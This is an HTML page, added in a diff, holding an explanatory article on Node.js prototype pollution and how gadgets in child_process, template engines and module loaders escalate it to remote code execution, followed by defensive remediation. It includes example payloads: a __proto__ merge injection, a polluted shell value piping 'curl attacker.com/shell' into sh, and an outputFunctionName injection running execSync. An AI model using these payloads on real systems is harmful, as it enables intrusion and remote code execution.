@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Node.js Prototype Pollution: How Gadgets Lead to RCE - javascript</title>
+    <meta name="description" content="Prototype pollution is a critical vulnerability class in JavaScript where an attacker manipulates the base Object.prototype, causing injected properties to be inherited across all objects in the runtime. While altering prototype properties is harmless in">
+    <link rel="canonical" href="https://salivity.github.io/javascript/article/node-js-prototype-pollution-how-gadgets-lead-to-rce">
+    <link rel="search" type="application/opensearchdescription+xml" title="javascript" href="/javascript/opensearch.xml">
+    <link rel="icon" href="/javascript/favicon.ico">
+    <link rel="stylesheet" href="/javascript/css/style.css">
+    <link media="print" rel="stylesheet" href="/javascript/css/print.css">
+    <script src="/javascript/js/fuse.min.js"></script>
+    <script src="/javascript/js/script.js"></script>
+    <script id="MathJax-script" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-chtml.min.js" defer></script>
+    <script src="/monetize/monetize.js"></script>
+    <script src="/social/social.js"></script>
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Node.js Prototype Pollution: How Gadgets Lead to RCE - javascript" />
+    <meta property="og:url" content="https://salivity.github.io/javascript/article/node-js-prototype-pollution-how-gadgets-lead-to-rce" />
+    <meta property="og:image:url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:secure_url" content="https://salivity.github.io/javascript/images/open-graph/default.webp" />
+    <meta property="og:image:width" content="1120" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:description" content="Prototype pollution is a critical vulnerability class in JavaScript where an attacker manipulates the base Object.prototype, causing injected properties to be inherited across all objects in the runtime. While altering prototype properties is harmless in" />
+    <link rel="manifest" href="/javascript/pwa/manifest.json" />
+</head>
+<body>
+    <header>
+        <a href="/javascript/" aria-label="Go To Home Page" title="Go To Home Page" id="logo">
+            <span>salivity.github.io/</span><span>javascript</span>
+        </a>
+        <nav>
+            <ul class="header-links">
+                <li><a href="/javascript/search" title="Search" aria-label="Go To Search Page"><svg class="svg-icon" aria-hidden="true" focusable="false" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"></path></svg></a></li>
+                <li><a id="theme-toggle" title="Theme" href="javascript:void(0);" aria-label="Toggle Website Theme"></a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <article><h1 id="nodejs-prototype-pollution-how-gadgets-lead-to-rce">Node.js
+Prototype Pollution: How Gadgets Lead to RCE</h1>
+<p>Prototype pollution is a critical vulnerability class in JavaScript
+where an attacker manipulates the base <code>Object.prototype</code>,
+causing injected properties to be inherited across all objects in the
+runtime. While altering prototype properties is harmless in isolation,
+it becomes severe when combined with "gadgets"—pre-existing code
+fragments in Node.js core or third-party dependencies that unsafely
+trust these inherited attributes. This article explains the technical
+mechanics behind prototype pollution gadgets and demonstrates how
+attackers leverage them to escalate property injection into arbitrary
+remote code execution (RCE).</p>
+<h3 id="the-foundation-prototype-pollution">The Foundation: Prototype
+Pollution</h3>
+<p>In JavaScript, objects inherit properties from prototypes via a
+prototype chain. When an application recursively merges, clones, or sets
+values based on untrusted user input without proper sanitization, an
+attacker can supply keys such as <code>__proto__</code> or
+<code>constructor.prototype</code>.</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerable merge operation</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">merge</span>(target<span class="op">,</span> source) {</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> key <span class="kw">in</span> source) {</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="kw">typeof</span> target[key] <span class="op">===</span> <span class="st">&#39;object&#39;</span> <span class="op">&amp;&amp;</span> <span class="kw">typeof</span> source[key] <span class="op">===</span> <span class="st">&#39;object&#39;</span>) {</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>            <span class="fu">merge</span>(target[key]<span class="op">,</span> source[key])<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        } <span class="cf">else</span> {</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>            target[key] <span class="op">=</span> source[key]<span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="co">// Attacker input</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="fu">merge</span>({}<span class="op">,</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(<span class="st">&#39;{&quot;__proto__&quot;: {&quot;polluted&quot;: true}}&#39;</span>))<span class="op">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>({}<span class="op">.</span><span class="at">polluted</span>)<span class="op">;</span> <span class="co">// true</span></span></code></pre></div>
+<p>Once <code>Object.prototype</code> is polluted, any object in the
+Node.js process that does not explicitly define that property will
+inherit the attacker's value.</p>
+<h3 id="what-is-a-gadget">What Is a Gadget?</h3>
+<p>A gadget is an existing piece of application code or library logic
+that:</p>
+<ol type="1">
+<li>Reads a configuration property from an uninitialized or partially
+defined object.</li>
+<li>Uses that property in a sensitive operation (such as file handling,
+process execution, or dynamic code evaluation) without checking
+<code>Object.prototype.hasOwnProperty()</code>.</li>
+</ol>
+<p>When prototype pollution takes place, the uninitialized property
+resolves up the prototype chain to the value provided by the attacker,
+redirecting the control flow.</p>
+<h3
+id="escalation-path-1-process-execution-via-child-processes">Escalation
+Path 1: Process Execution via Child Processes</h3>
+<p>The most direct route to RCE involves the Node.js
+<code>child_process</code> module (<code>spawn</code>,
+<code>fork</code>, <code>exec</code>). When
+<code>child_process.spawn()</code> or related functions are invoked,
+they typically accept an <code>options</code> object. If an application
+invokes <code>child_process.spawn('ls', [], options)</code> where
+<code>options</code> is empty or lacks specific flags, properties fall
+back to the prototype chain.</p>
+<p>Notable gadget properties include:</p>
+<ul>
+<li><strong><code>shell</code></strong>: Setting <code>shell</code> to a
+path (e.g., <code>/bin/sh</code> or <code>cmd.exe</code>) forces
+execution through a command interpreter.</li>
+<li><strong><code>NODE_OPTIONS</code> via <code>env</code></strong>: If
+the gadget allows injecting into <code>options.env</code>, an attacker
+can specify <code>NODE_OPTIONS="--require /path/to/payload"</code> or
+<code>--eval</code> flags when a secondary Node process is created via
+<code>child_process.fork()</code>.</li>
+<li><strong><code>argv0</code></strong>: Alters the first argument
+passed to the spawned process, which can manipulate command execution
+context.</li>
+</ul>
+<p>If <code>Object.prototype.shell</code> is polluted with
+<code>"/bin/sh -c 'curl attacker.com/shell | sh' #"</code>, subsequent
+calls to <code>child_process.spawn</code> that do not explicitly declare
+<code>options.shell</code> will execute the payload instead of the
+intended command.</p>
+<h3 id="escalation-path-2-template-engines">Escalation Path 2: Template
+Engines</h3>
+<p>Many server-side templating engines (such as EJS, Pug, or Handlebars)
+compile templates into raw JavaScript functions at runtime for
+performance optimization. These compilation steps often look for
+internal configuration properties that are not typically set in standard
+user options.</p>
+<p>For example, in vulnerable versions of template engines, options such
+as:</p>
+<ul>
+<li><code>outputFunctionName</code></li>
+<li><code>client</code></li>
+<li><code>escapeFunction</code></li>
+</ul>
+<p>are checked during compilation. If an attacker pollutes
+<code>Object.prototype.outputFunctionName</code> with a string
+containing raw JavaScript syntax (e.g.,
+<code>x;process.mainModule.require('child_process').execSync('whoami');</code>),
+the template engine concatenates this string directly into the
+dynamically generated function body created via
+<code>new Function(...)</code>. When the template renders, the payload
+executes.</p>
+<h3 id="escalation-path-3-dynamic-module-loading">Escalation Path 3:
+Dynamic Module Loading</h3>
+<p>Node.js internal file resolution or third-party loaders often
+construct paths dynamically using configuration objects. If an attacker
+can pollute attributes like <code>paths</code>, <code>extensions</code>,
+or <code>main</code>, they can trick the runtime into loading an
+attacker-controlled file or an arbitrarily uploaded script via
+<code>require()</code> or <code>import()</code>, executing malicious
+logic upon resolution.</p>
+<h3 id="remediation-and-defense">Remediation and Defense</h3>
+<p>Preventing gadget exploitation requires addressing both the root
+injection vector and the gadget execution environment:</p>
+<ul>
+<li><strong>Prevent Pollution at Input Boundaries</strong>: Validate all
+JSON schemas to reject keys named <code>__proto__</code>,
+<code>constructor</code>, and <code>prototype</code>.</li>
+<li><strong>Use Prototype-less Objects</strong>: Store dynamic key-value
+pairs in objects created with <code>Object.create(null)</code> or use
+<code>Map</code> primitives instead of standard objects.</li>
+<li><strong>Freeze the Prototype</strong>: Execute
+<code>Object.freeze(Object.prototype)</code> early in the application
+lifecycle to prevent any modifications at runtime.</li>
+<li><strong>Node.js Flags</strong>: Run Node.js with the
+<code>--disable-proto=throw</code> or
+<code>--disable-proto=delete</code> command-line flag to restrict access
+to <code>Object.prototype.__proto__</code>.</li>
+</ul></article>
+        <div id="comments-container"></div>
+
+        <script>
+            const utterancesScript = document.createElement('script');
+            
+            utterancesScript.setAttribute('src', 'https://utteranc.es/client.js');
+            utterancesScript.setAttribute('repo', 'salivity/javascript'); 
+            utterancesScript.setAttribute('issue-term', 'pathname'); 
+            utterancesScript.setAttribute('theme', localStorage.getItem('theme') === 'dark' ? 'github-dark' : 'github-light'); 
+            utterancesScript.setAttribute('crossorigin', 'anonymous');
+            utterancesScript.async = true;
+
+            document.getElementById('comments-container').appendChild(utterancesScript);
+        </script>
+    
+    </main>
+    <footer>
+        <nav>
+            <ul class="social-links">
+            </ul>
+        </nav>
+        <nav>
+            <ul class="footer-links">
+                <li><a href="/javascript/privacy-policy">Privacy Policy</a></li>
+                <li><a href="/javascript/terms-and-conditions">Terms and Conditions</a></li>
+            </ul>
+        </nav>
+        <div class="copyright">
+            Copyright &copy; <span id="current-year"></span>
+        </div>
+    </footer>
+</body>
+</html>
